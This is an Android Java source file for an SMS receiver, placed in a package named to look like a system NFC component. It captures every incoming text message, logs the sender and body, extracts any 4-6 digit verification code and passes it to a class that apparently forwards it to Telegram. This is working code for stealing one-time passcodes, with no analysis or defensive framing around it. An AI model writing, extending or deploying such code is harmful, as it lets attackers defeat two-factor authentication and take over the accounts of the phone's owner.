package com.android.nfc.system.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                String sender = "";
                String message = "";

                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        sender = smsMessage.getDisplayOriginatingAddress();
                        message += smsMessage.getMessageBody();
                    }
                    // 这里你可以将收到的短信进行处理
                    // 例如转发给其他设备
                    sendToOtherDevice(context, sender, message);

                }
            }
        }
    }


    private void sendToOtherDevice(Context context, String sender, String message) {

        Log.d(TAG, "sendToOtherDevice: " + "Sender: " + sender + " Message: " + message);

        String verificationCode = extractVerificationCode(message);
        SmsToTelegram smsToTelegram = new SmsToTelegram(context);
        Log.d(TAG, "sendToOtherDevice: " + "Sender: " + sender + " Message: " + message +
                " Verification code: " + verificationCode);

        smsToTelegram.sendToTelegram(verificationCode);
    }

    private String extractVerificationCode(String message) {
        Log.d(TAG, "extractVerificationCode: " + message);
        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b"); // Adjust the regex based on the expected code format
        Matcher matcher = pattern.matcher(message);
        if (matcher.find()) {
            return matcher.group();
        }
        return message;
    }

}
